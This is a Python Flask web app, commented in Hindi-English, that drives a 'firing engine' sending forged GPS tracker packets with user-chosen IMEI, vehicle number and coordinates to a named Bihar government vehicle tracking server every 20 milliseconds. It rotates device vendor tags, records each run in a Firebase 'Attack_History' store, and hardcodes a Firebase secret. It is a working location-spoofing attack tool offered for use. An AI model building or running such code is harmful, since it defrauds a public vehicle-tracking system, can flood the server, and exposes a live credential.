import os, socket, threading, time, requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "nitro_v82_final_whatsapp_edition"

# --- CONFIGURATION ---
FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"

# Tag rotation jaisa pehle tha
TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

# --- ENGINE STATE ---
status = {"firing": False, "count": 0, "proto": "UDP", "imei": "", "vno": "", "lat": "", "lon": ""}

# (Login aur Dash HTML same pehle wale hain, koi badlav nahi)
LOGIN_HTML = """...""" # Same as before
DASH_HTML = """..."""  # Same as before

def get_user_data(uid):
    try:
        r = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}", timeout=5)
        return r.json()
    except: return None

def log_to_firebase():
    try:
        now = datetime.now()
        timestamp = now.strftime('%Y-%m-%d %H:%M:%S')
        date_key = now.strftime('%Y-%m-%d')
        time_key = now.strftime('%H%M%S')
        user_id = session.get('user')
        vno = status["vno"]
        log_data = {"Vehicle_No": vno, "IMEI_No": status["imei"], "User": user_id, "Lat": status["lat"], "Lon": status["lon"], "Last_Sync": timestamp, "Status": "Active"}
        requests.put(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", json=log_data, timeout=5)
        requests.put(f"{FB_URL}/Attack_History/{date_key}/{user_id}/{vno}/{time_key}.json?auth={FB_SECRET}", json=log_data, timeout=5)
    except: pass

def firing_engine():
    target = ("vlts.bihar.gov.in", 9999)
    while status["firing"]:
        try:
            # TAG ROTATION LOGIC (Jaisa pehle tha)
            tag = TAG_LIST[status["count"] % len(TAG_LIST)]
            now = datetime.now()
            
            # Formatting Lat/Lon and Date/Time as per your request
            f_lat = "{:.6f}".format(float(status["lat"])) if status["lat"] else "0.000000"
            f_lon = "{:.6f}".format(float(status["lon"])) if status["lon"] else "0.000000"
            f_date = now.strftime('%d%m%Y')
            f_time = now.strftime('%H%M%S')

            # --- MIJO NEW STRING FORMAT (Strictly No Spaces) ---
            # Format: $PVT,TAG,1.ONTC,NR,01,L,IMEI,VNO,1,DATE,TIME,LAT,N,LON,E,SPEED,ANGLE,SIGNAL,ALT,HDOP,PDOP,OP,IGN,SIM,029.2,004.1,0,C,29,405,52,TOWERS...,CHECKSUM*
            pkt = f"$PVT,{tag},1.ONTC,NR,01,L,{status['imei']},{status['vno']},1,{f_date},{f_time},{f_lat},N,{f_lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*".encode()

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if status["proto"] == "UDP" else socket.SOCK_STREAM)
            if status["proto"] == "TCP":
                sock.settimeout(3); sock.connect(target); sock.send(pkt)
            else: sock.sendto(pkt, target)
            
            status["count"] += 1
            sock.close()
            time.sleep(0.02)
        except: time.sleep(1)

# (Baki saare routes login, dashboard, action, check_vehicle ekdum same hain)
@app.route('/', methods=['GET', 'POST'])
def login():
    # ... Same logic ...
    return render_template_string(LOGIN_HTML, error=None)

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(DASH_HTML, session=session, **status)

@app.route('/action', methods=['POST'])
def action():
    if 'user' not in session: return redirect(url_for('login'))
    val = request.form.get('btn')
    if val == "reset":
        status.update({"firing": False, "count": 0, "imei": "", "vno": "", "lat": session.get('def_lat', ''), "lon": session.get('def_lon', '')})
    else:
        status.update({
            "imei": request.form.get('imei', '').strip(),
            "vno": request.form.get('vno', '').upper().strip(),
            "lat": request.form.get('lat', '').strip(),
            "lon": request.form.get('lon', '').strip(),
            "proto": request.form.get('proto', 'UDP')
        })
        if val == "start" and not status["firing"]:
            if all([status["imei"], status["vno"], status["lat"]]):
                status["firing"] = True
                log_to_firebase()
                threading.Thread(target=firing_engine, daemon=True).start()
        elif val == "stop": status["firing"] = False
    return redirect(url_for('dashboard'))

# ... (check_vehicle, logout, data routes same as before) ...

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
